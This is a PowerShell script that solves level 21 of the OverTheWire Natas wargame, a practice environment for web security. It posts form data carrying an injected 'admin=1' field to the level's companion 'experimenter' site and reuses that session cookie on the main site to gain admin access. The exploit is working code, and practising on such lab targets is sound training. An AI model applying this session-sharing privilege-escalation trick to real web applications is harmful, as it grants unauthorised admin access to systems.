. "../natas_filter.ps1"

param (
    [Parameter(Mandatory=$true)]
    [string]$server,
    [Parameter(Mandatory=$true)]
    [string]$username,
    [Parameter(Mandatory=$true)]
    [string]$password,
    [string]$type
)
$url = $server

$pair = "${username}:${password}"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)
$authorization = "Basic $base64"

$headers = @{
    "Authorization" = $authorization
    "Content-Type"  = "application/x-www-form-urlencoded"
} 

$serverExp = "natas21-experimenter.natas.labs.overthewire.org"

$url = "http://$server/index.php?debug"
$urlExp = "http://$serverExp/index.php?debug"

$postData = @{
    submit = "Update"
    bgcolor = "#333333"
    align = "right"
    fontsize = "80%"
    admin = 1
}

$postData | ConvertTo-Json

Write-Host "-----------------------------------"
Write-Host $url
Write-Host "-----------------------------------"
$response = Invoke-WebRequest -URI $urlExp -Headers $headers -Method 'POST' -Body $postData -SessionVariable sessVar
"-----------------"
$response = Invoke-WebRequest -URI $url -Headers $headers -WebSession $sessVar
FilterNatasHTML($response) 

